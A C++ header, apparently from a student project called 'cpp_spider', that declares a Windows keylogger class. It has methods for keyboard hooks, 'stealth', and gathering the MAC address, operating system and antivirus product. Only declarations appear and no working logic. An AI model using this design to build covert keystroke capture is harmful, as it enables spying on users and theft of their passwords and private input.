//
// KeyLogger.hpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/includes
//
// Made by Jeremy Thoveron
// Login   <jeremy.thoveron-@epitech.net>
//
// Started on  Fri Sep 29 16:00:48 2017 Jeremy Thoveron
// Last update Fri Sep 29 16:19:46 2017 Jeremy Thoveron
//

#ifndef CPP_SPIDER_KEYLOGGER_HPP
#define CPP_SPIDER_KEYLOGGER_HPP

#include	<fstream>
#include	<iostream>
#include	<string>
#include	<map>
#include	<windows.h>
#include	"IKeyLogger.hpp"

class 		WindowsKeyLogger : public IKeyLogger
{
private:
  bool 		shift;
  bool		capslock;

public:
  static std::map<DWORD, std::string> const keys;
  static std::map<int, std::string> const correlingTable;
public:
  WindowsKeyLogger();
  ~WindowsKeyLogger();
  bool 		checkUpper();
  void		initHooks();
  void		stealth();
  void		unHooks();
  void		getMacAddr();
  void		getOperatingSystem();
  void		getAntiVirus();
};

LRESULT CALLBACK handleKeyboard(int code, WPARAM wp, LPARAM lp);

#endif //CPP_SPIDER_KEYLOGGER_HPP
